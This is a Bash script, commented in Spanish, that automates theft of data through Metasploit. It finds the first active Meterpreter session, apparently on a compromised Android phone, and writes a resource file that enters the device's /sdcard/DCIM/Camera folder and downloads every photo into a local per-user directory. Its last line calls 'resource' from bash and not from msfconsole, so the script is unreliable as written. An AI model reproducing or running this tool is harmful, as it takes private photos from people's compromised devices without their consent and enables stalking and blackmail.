#!/bin/bash

# Función para mostrar el uso del script
usage() {
    echo "Uso: $0 -u|-user <USERNAME>"
    exit 1
}

# Inicializar la variable USERNAME
USERNAME=""

# Procesar argumentos de línea de comandos
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--user) USERNAME="$2"; shift ;;
        -h|--help) usage ;;
        *) usage ;;
    esac
    shift
done

# Verificar si se proporcionó un nombre de usuario
if [[ -z "$USERNAME" ]]; then
    echo -e "\e[31mDebe proporcionar un nombre de usuario con la opción -u.\e[0m"
    usage
fi

# Directorio de destino en tu máquina
DEST_DIR="./data/$USERNAME"

# Obtener el primer ID de sesión disponible
SESSION_ID=$(msfconsole -q -x "sessions -l; exit" | awk '/^\s*[0-9]+/ {print $1; exit}')

# Verificar si se encontró una sesión
if [ -z "$SESSION_ID" ]; then
    echo -e "\e[31mNo se encontró ninguna sesión activa.\e[0m"
    exit 1
fi

echo -e "\e[32mSe encontró una sesión activa con el ID $SESSION_ID.\e[0m"
echo -e "\e[32mCreando el directorio de destino $DEST_DIR...\e[0m"

# Crear el directorio de destino si no existe
mkdir -p "$DEST_DIR"

# Generar el archivo de recursos de Metasploit
cat <<EOL > get.rc
sessions -i $SESSION_ID --timeout 7200
cd /sdcard/DCIM/Camera
download * $DEST_DIR
exit
EOL

# Ejecutar Metasploit con el archivo de recursos
resource get.rc